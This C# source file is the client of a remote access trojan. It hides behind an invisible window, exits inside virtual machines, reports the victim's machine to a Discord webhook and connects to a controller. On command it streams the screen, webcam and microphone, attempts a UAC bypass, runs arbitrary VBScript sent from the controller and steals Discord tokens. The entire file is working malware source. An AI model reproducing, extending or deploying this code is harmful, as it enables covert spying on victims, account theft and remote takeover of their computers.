using AForge.Video;
using AForge.Video.DirectShow;
using LazyServer;
using NAudio.Wave;
using Newtonsoft.Json.Linq;
using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Client
{
    internal static class Program
    {
        public static JObject config = GClass.config();
        public static int monitoridx = 0;
        public static int cameraidx = 0;
        public static int micidx = 0;

        private static CancellationTokenSource screenshotTokenSource;
        private static Task screenshotLoopTask;
        private static readonly object screenshotLock = new();
        private static bool screenshotLoopRunning = false;

        private static CancellationTokenSource camTokenSource;
        private static Task camLoopTask;
        private static bool camLoopRunning = false;

        private static CancellationTokenSource micTokenSource;
        private static Task micLoopTask;
        private static bool micLoopRunning = false;

        public static bool isGracefulDisconnect = false;
        private static WaveInEvent waveIn;

        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Task.Run(RunClientAsync);
            Application.Run(new InvisibleForm());
        }

        static async Task RunClientAsync()
        {
            if (GClass.IsTrue("debugmessage")) {
                MessageBox.Show("it works");
            }

            if (GClass.IsTrue("binfile")) { // for the builder
                Process.GetCurrentProcess().Kill();
            }

            if (GClass.IsTrue("antivm") && VirtualizationDetection.VMDetector.Detect() != VirtualizationDetection.VmType.None)
            {
                Process.GetCurrentProcess().Kill();
            }

            JObject clientInfo = await GClass.BuildClientInfo();

            if (GClass.IsTrue("discord") && config["webhook"] != null)
            {
                string webhookUrl = (string)config["webhook"];
                _ = GClass.SendWebhookNotificationAsync(webhookUrl, clientInfo);
            }

            var client = new LazyServerClient();
            await GClass.ReconnectLoop(client);

            client.Disconnected += async (s, e) =>
            {
                if (!isGracefulDisconnect)
                {
                    await GClass.ReconnectLoop(client);
                }
            };

            var screenshot = GClass.CaptureScreen(Screen.AllScreens[monitoridx]);
            await client.SendFileBytesWithMeta(screenshot, clientInfo.ToString());

            GClass.StartHeartbeat(client);

            client.MessageReceived += async (s, e) =>
            {
                try
                {
                    JObject message = JObject.Parse(e.Message);
                    string command = (string)message["command"];

                    switch (command)
                    {
                        case "ssloop":
                            if (!screenshotLoopRunning)
                                await StartScreenshotLoopAsync(client, message);
                            break;

                        case "stopss":
                            if (screenshotLoopRunning)
                                await StopScreenshotLoopAsync();
                            break;

                        case "camloop":
                            if (!camLoopRunning)
                                await StartCamLoopAsync(client, message);
                            break;

                        case "stopcam":
                            if (camLoopRunning)
                                await StopCamLoopAsync();
                            break;

                        case "micloop":
                            if (!micLoopRunning)
                                await StartMicLoopAsync(client);
                            break;

                        case "stopmic":
                            if (micLoopRunning)
                                await StopMicLoopAsync();
                            break;

                        case "mon":
                            monitoridx = (int)message["idx"];
                            break;

                        case "cam":
                            cameraidx = (int)message["idx"];
                            break;

                        case "mic":
                            micidx = (int)message["idx"];
                            break;

                        case "uacbypass":
                            isGracefulDisconnect = true;
                            client.Disconnect();

                            if (!await GClass.TryBypassAndReconnect(client, screenshot))
                                isGracefulDisconnect = false;

                            break;

                        case "vbexec":
                            string tempPath = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName() + ".vbs");
                            try
                            {
                                File.WriteAllText(tempPath, (string)message["body"]);
                                ProcessStartInfo psi = new()
                                {
                                    FileName = "wscript.exe",
                                    Arguments = $"\"{tempPath}\"",
                                    UseShellExecute = false,
                                    CreateNoWindow = true
                                };
                                using var p = Process.Start(psi);
                                p?.WaitForExit();
                            }
                            finally
                            {
                                try { File.Delete(tempPath); } catch { }
                            }
                            break;

                        case "grabtoken":
                            await client.SendMessage(new JObject
                            {
                                ["msg"] = "token",
                                ["body"] = GClass.GetDiscordTokens()
                            }.ToString());
                            break;
                    }
                }
                catch { /* silently ignore */ }
            };
        }

        static async Task StartScreenshotLoopAsync(LazyServerClient client, JObject message)
        {
            await StopScreenshotLoopAsync();

            screenshotTokenSource = new CancellationTokenSource();
            var token = screenshotTokenSource.Token;

            int quality = 100;
            if (message["quality"] != null &&
                message["quality"].ToString().EndsWith("%") &&
                int.TryParse(message["quality"].ToString().TrimEnd('%'), out int qVal))
            {
                quality = Math.Max(10, Math.Min(qVal, 100));
            }

            screenshotLoopTask = Task.Run(async () =>
            {
                while (!token.IsCancellationRequested)
                {
                    try
                    {
                        var shot = GClass.CaptureScreen(Screen.AllScreens[monitoridx], quality);
                        await client.SendFileBytesWithMeta(shot, new JObject
                        {
                            ["msg"] = "screenshot",
                            ["monitors"] = Screen.AllScreens.Length
                        }.ToString());
                    }
                    catch { }

                    try
                    {
                        await Task.Delay(70, token);
                    }
                    catch (OperationCanceledException) { break; }
                }
            }, token);

            screenshotLoopRunning = true;
        }

        static async Task StopScreenshotLoopAsync()
        {
            lock (screenshotLock)
            {
                if (screenshotTokenSource == null)
                    return;
                screenshotTokenSource.Cancel();
            }

            if (screenshotLoopTask != null)
            {
                try { await screenshotLoopTask; }
                catch (OperationCanceledException) { }
                catch { }
            }

            screenshotTokenSource?.Dispose();
            screenshotTokenSource = null;
            screenshotLoopTask = null;
            screenshotLoopRunning = false;
        }

        static async Task StartCamLoopAsync(LazyServerClient client, JObject message)
        {
            await StopCamLoopAsync();

            camTokenSource = new CancellationTokenSource();
            var token = camTokenSource.Token;

            int quality = 90;
            if (message["quality"] != null &&
                message["quality"].ToString().EndsWith("%") &&
                int.TryParse(message["quality"].ToString().TrimEnd('%'), out int qVal))
            {
                quality = Math.Max(10, Math.Min(qVal, 100));
            }

            camLoopTask = Task.Run(async () =>
            {
                var devices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                if (devices.Count == 0 || cameraidx >= devices.Count) return;

                var videoSource = new VideoCaptureDevice(devices[cameraidx].MonikerString);
                Bitmap currentFrame = null;
                var frameReady = new ManualResetEventSlim(false);

                videoSource.NewFrame += (s, e) =>
                {
                    currentFrame?.Dispose();
                    currentFrame = (Bitmap)e.Frame.Clone();
                    frameReady.Set();
                };

                videoSource.Start();

                try
                {
                    while (!token.IsCancellationRequested)
                    {
                        frameReady.Wait(token);
                        frameReady.Reset();

                        if (currentFrame != null)
                        {
                            using var ms = new MemoryStream();
                            var encoderParams = new EncoderParameters(1);
                            encoderParams.Param[0] = new EncoderParameter(Encoder.Quality, quality);
                            var jpegCodec = GClass.GetEncoder(ImageFormat.Jpeg);
                            currentFrame.Save(ms, jpegCodec, encoderParams);

                            await client.SendFileBytesWithMeta(ms.ToArray(), new JObject
                            {
                                ["msg"] = "camframe",
                                ["cameras"] = devices.Count
                            }.ToString());
                        }

                        await Task.Delay(100, token);
                    }
                }
                catch (OperationCanceledException) { }
                catch { }
                finally
                {
                    if (videoSource.IsRunning)
                        videoSource.SignalToStop();
                    videoSource.WaitForStop();

                    currentFrame?.Dispose();
                }
            }, token);

            camLoopRunning = true;
        }

        static async Task StopCamLoopAsync()
        {
            if (camTokenSource != null)
            {
                camTokenSource.Cancel();
                try { await camLoopTask; } catch (OperationCanceledException) { } catch { }
                camTokenSource.Dispose();
            }

            camTokenSource = null;
            camLoopTask = null;
            camLoopRunning = false;
        }

        static async Task StartMicLoopAsync(LazyServerClient client)
        {
            await StopMicLoopAsync();

            micTokenSource = new CancellationTokenSource();
            var token = micTokenSource.Token;

            int deviceCount = WaveIn.DeviceCount;
            if (deviceCount == 0 || micidx >= deviceCount) return;

            waveIn = new WaveInEvent
            {
                DeviceNumber = micidx,
                WaveFormat = new WaveFormat(8000, 16, 1),
                BufferMilliseconds = 50
            };

            waveIn.DataAvailable += (s, e) =>
            {
                if (token.IsCancellationRequested) return;

                var pcm = new byte[e.BytesRecorded];
                Array.Copy(e.Buffer, 0, pcm, 0, e.BytesRecorded);

                _ = client.SendFileBytesWithMeta(pcm, new JObject
                {
                    ["msg"] = "micaudio",
                    ["microphones"] = deviceCount
                }.ToString());
            };

            waveIn.StartRecording();
            micLoopRunning = true;

            micLoopTask = Task.Run(async () =>
            {
                try
                {
                    while (!token.IsCancellationRequested)
                        await Task.Delay(100, token);
                }
                catch (OperationCanceledException) { }
                finally
                {
                    waveIn.StopRecording();
                    waveIn.Dispose();
                }
            }, token);
        }

        static async Task StopMicLoopAsync()
        {
            if (micTokenSource != null)
            {
                micTokenSource.Cancel();
                try { await micLoopTask; } catch { };
                micTokenSource.Dispose();
            }

            micTokenSource = null;
            micLoopTask = null;
            micLoopRunning = false;
        }
    }

    public class InvisibleForm : Form
    {
        public InvisibleForm()
        {
            ShowInTaskbar = false;
            WindowState = FormWindowState.Minimized;
            FormBorderStyle = FormBorderStyle.None;
            Opacity = 0;
            Load += (s, e) => Hide();
        }
    }
}
